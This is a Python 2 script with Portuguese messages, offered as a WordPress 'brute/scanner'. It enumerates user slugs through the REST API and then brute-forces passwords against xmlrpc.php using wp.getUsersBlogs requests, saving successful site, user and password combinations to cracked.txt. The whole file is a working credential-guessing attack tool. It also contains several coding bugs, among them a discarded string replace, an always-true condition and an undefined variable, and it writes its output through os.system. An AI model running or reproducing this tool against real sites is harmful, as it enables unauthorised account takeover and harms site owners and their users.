#!/usr/bin/python
#coding: utf-8

import thread
import json
import requests
import argparse as arg
import sys
import os
import time

print(''' 
    ____             __      _       __
   / __ \_________  / /_____| |     / /___ __   _____ 
  / /_/ / ___/ __ \/ __/ __ \ | /| / / __ `/ | / / _ \

 / ____/ /  / /_/ / /_/ /_/ / |/ |/ / /_/ /| |/ /  __/
/_/   /_/   \____/\__/\____/|__/|__/\__,_/ |___/\___/ 
 v1.1

[!] Brute/Scanner cms (wordpress)
[!] Mass brute force - Disponivel na versao 2.0
[!] Desenvolvido por ./Cryptonking (B4l0x)
''')

parser = arg.ArgumentParser(description="Wordpress brute/scan by B4l0x")
parser.add_argument("--site","-s", help="Site wordpress", required=True, type=str)
parser.add_argument("--wordlist", "-w", help="Wordlist de senhas", required=True, default="wordlist.txt", type=str)
parser.add_argument("--usuario", "-u", help="Usuario alvo", default="null", required=False, type=str)
parser.add_argument("--sleep", "-slp", default="2", help="Time sleep usado no Thread", required=False, type=int)
x = parser.parse_args()

site = x.site
site.replace("https://", "http://")
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36', 'Cookie': 'humans_21909=1'}
usuarios = []
wpok = []
confirmado= []
tempo = time.strftime("%H:%M:%S")
alocthread = thread.allocate_lock()

def verwp():
        try:
                print("[{} INFO] Confirmando site wordpress...").format(tempo)
                try:
                        response = requests.get(site+"/xmlrpc.php", timeout=10, headers=header).text
                        logins = requests.get(site+"/wp-json/wp/v2/users", timeout=10, headers=header).text
                except requests.ConnectionError:
                        print("[{} INFO] Host nao pode ser resolvido").format(tempo)
                        exit()
                except Exception as e:
                        print("[{} INFO] Host nao pode ser resolvido erro: {}").format(tempo, e)
                        exit()
                if "XML-RPC server accepts POST requests only." in response:
                        print("[{} INFO] URL {} [XMLRPC] [OK]").format(tempo,site)
                        if "slug" in logins:
                                print("[{} INFO] URL {} [LOGIN] [OK]").format(tempo,site)
                                confirmado.append("1")
                                wpok.append(site)
                elif "cptch_input" or not "XML-RPC server accepts POST requests only." or "Not Found" or "404" in response:
                                print("[{} INFO] URL {} [XMLRPC Bloqueado]").format(tempo,site)
                                print(response)
                                exit()
        except KeyboardInterrupt:
                        print("[{} INFO] Obrigado por usar meu script!").format(tempo)
                        exit()
        except requests.ConnectionError:
                        print("[{} INFO] Host nao pode ser resolvido").format(tempo)
                        exit()
        except Exception as e:
                        print("[{} INFO] Host nao pode ser resolvido erro: {}").format(tempo, e)
                        exit()

def capturausuarios():
        try:
                if confirmado[0] != "":
                        try:
                                print("[{} INFO] Inciando busca de usuario(s)...").format(tempo)
                                for site in wpok:
                                        response = requests.get(site+"/wp-json/wp/v2/users", timeout=5, headers=header).text
                                        if "slug" in response:
                                                dados = json.loads(response)
                                                print("\n[{} INFO] URL {}").format(tempo,site)
                                                for user in dados[0:40]:
                                                        print("[{} INFO] Usuario(s) encontrado(s): {}").format(tempo,user['slug'])
                                                        usuarios.append(user['slug'])
                                        elif not "slug" in response:
                                                        print("[{} INFO] Nao foi possivel encontrar usuario(s) nessa url: {}").format(tempo,url)
                        except KeyboardInterrupt:
                                        print("[{} INFO] Obrigado por usar meu script!").format(tempo)
                        except:
                                print("[{} INFO] Erro ao obter usuarios, seu teste sera inciado usando admin").format(tempo)
                                usuarios.append('admin')
                                return capturausuarios
        except:
                print("[{} INFO] Falha ao confirmar site wordpress...").format(tempo)
                exit()
def brute(i):
        try:
                ii = i.replace("\n", "")
                for usuario in usuarios:
                        for site in wpok:
                                xml='''<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>'''%(usuario,ii)
                                response = requests.get(site+"/xmlrpc.php", timeout=10, headers=header).text
                                r = requests.post(site+"xmlrpc.php", data=xml, timeout=30, headers=header).text
                                if "XML-RPC server accepts POST requests only." in response:
                                        if 'isAdmin' in r:
                                                alocthread.acquire()
                                                print("\n\t[{} INFO] URL: {} <=> {}:{} [LOGIN EFETUADO COM SUCESSO]\n").format(tempo,site,usuario,ii)
                                                os.system(str("echo {}:{}:{} >> {}").format(site,usuario,ii,"cracked.txt"))
                                                break
                                                alocthread.release()
                                        elif 'faultString' in r:
                                                alocthread.acquire()
                                                #print(r)
                                                print("[{} INFO] URL: {} <=> {}:{} [Login Falhou]").format(tempo,site,usuario,ii)
                                                alocthread.release()
                                        elif 'Not Acceptable!' in r:
                                                alocthread.acquire()
                                                print("[{} INFO] URL: {} [Firewall]").format(tempo,site)
                                                exit()
                                                break
                                                alocthread.release()
                                        else:
                                                continue
                                elif "cptch_input" or not "XML-RPC server accepts POST requests only." or "Not Found" or "404" in response:
                                        print("[{} INFO] URL {} [XMLRPC Bloqueado]").format(tempo,site)
                                        exit()
        except KeyboardInterrupt:
                        print("[{} INFO] Obrigado por usar meu script!").format(tempo)
                        exit()
        except Exception as e:
                alocthread.acquire()
                print("[{} INFO] Conexao perdida com o host, Reconectando...").format(tempo)
                alocthread.release()

            
verwp()
print("")
if x.usuario == "null":
        capturausuarios()
else:
        wpok.append(site)
        confirmado.append("1")
        usuarios.append(x.usuario)
        print("[{} INFO] Brute force sera inciado usando login {}").format(tempo,x.usuario)
print("")
try:
        try:
                wordlist = open(x.wordlist, 'r').readlines()
        except:
                print("[{} INFO] Verifique o caminho da wordlist e tente novamente...").format(tempo)
                exit()
        for i in wordlist:
                time.sleep(0.+x.sleep)
                thread.start_new_thread(brute, (i,))
except KeyboardInterrupt:
                        print("\n\t[{} INFO] Finalizado, obrigado por usar by B4l0x...\n").format(tempo)
                        exit()
